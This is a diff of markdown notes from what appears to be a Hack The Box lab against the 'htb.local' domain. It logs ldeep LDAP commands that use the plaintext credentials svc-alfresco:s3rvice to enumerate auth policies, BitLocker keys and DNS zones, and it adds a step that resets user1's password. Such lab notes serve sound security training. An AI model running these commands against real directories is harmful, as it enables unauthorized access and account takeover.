@@ -1,3 +1,4 @@
+## ldap
 ### auth_policis
 ```sh
 └─$ ldeep ldap -d htb.local -s 10.129.143.161 -t ntlm -u svc-alfresco -p s3rvice auth_policies
@@ -6,7 +7,7 @@
 
 
 ### bitlockerkeys
-```
+```sh
 └─$ ldeep ldap -d htb.local -s 10.129.143.161 -t ntlm -u svc-alfresco -p s3rvice bitlockerkeys
 
  ```
@@ -624,7 +625,7 @@ Administrator
 ```
 
 
-### zones
+### zone
 ```sh
 └─$ ldeep ldap -d htb.local -s 10.129.143.161 -t ntlm -u svc-alfresco -p s3rvice zone htb.local
 [+] Domain records:
@@ -809,4 +810,11 @@ HTB\svc-alfresco
   "whenCreated": "2025-08-26T13:17:55+00:00"
 }]
 
+```
+
+
+### modify_password
+```sh
+└─$ ldeep ldap -d htb.local -s 10.129.143.161 -t ntlm -u svc-alfresco -p s3rvice modify_password user1 '@WSX3edc'
+[+] Password of user1 changed
 ```
